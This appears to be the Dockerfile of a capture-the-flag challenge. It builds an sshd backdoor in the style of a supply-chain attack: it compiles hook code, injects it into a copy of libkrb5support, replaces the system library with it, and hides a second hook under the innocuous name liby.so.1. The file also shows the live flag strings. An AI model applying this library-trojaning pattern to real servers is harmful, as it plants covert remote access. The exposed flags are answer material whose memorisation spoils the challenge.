FROM docker.io/debian:bookworm-slim as base

ARG DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y openssh-server

FROM base as backdoor_builder

# TODO: Before archiving, revert this change
#ARG FLAG1="SSM{part1_placeholder_flag}"
ARG FLAG1="SSM{based_0n_4_Tru3_St0ry}"

RUN apt-get update && apt-get install -y build-essential python3 python3-pip python3-venv libssl-dev git cmake

RUN mkdir -p /build
WORKDIR /build

RUN git clone https://github.com/kubo/plthook.git

COPY requirements.txt .
RUN python3 -m venv venv
RUN venv/bin/python -m pip install -r requirements.txt

RUN cp -L $(ldd /usr/sbin/sshd | grep libkrb5support.so | awk '{print $3}') /build/
COPY add-init.py .
COPY generate-flag1.py .
COPY sshd-init-hook.c .
COPY sshd-crypto-hook.c .

RUN python3 generate-flag1.py $FLAG1
RUN gcc -O2 -fPIC --shared -fvisibility=hidden -o sshd-backdoor.so -DRELEASE sshd-crypto-hook.c flag.c -Iplthook plthook/plthook_elf.c
RUN strip sshd-backdoor.so

RUN gcc -O2 -fcf-protection=none -nostdlib -nodefaultlibs -fvisibility=hidden -fPIC --shared -DRELEASE -o sshd-hook.elf sshd-init-hook.c
RUN venv/bin/python add-init.py libkrb5support-backdoored.so libkrb5support.so.0 sshd-hook.elf

FROM base as challenge

# TODO: Before archiving, revert this change
#ARG FLAG2="SSM{part2_placeholder_flag}"
ARG FLAG2="SSM{m4yb3_0ne_0f_MaNy}"

COPY --from=backdoor_builder /build/libkrb5support-backdoored.so /tmp/libkrb5support-backdoored.so
COPY --from=backdoor_builder /build/sshd-backdoor.so /lib/x86_64-linux-gnu/liby.so.1
RUN chmod 644 /tmp/libkrb5support-backdoored.so
RUN mv /tmp/libkrb5support-backdoored.so $(ldd /usr/sbin/sshd | grep libkrb5support.so | awk '{print $3}')

RUN mkdir /var/run/sshd
RUN echo "$FLAG2" > /root/flag-part2.txt

EXPOSE 22

CMD ["/usr/sbin/sshd", "-D"]
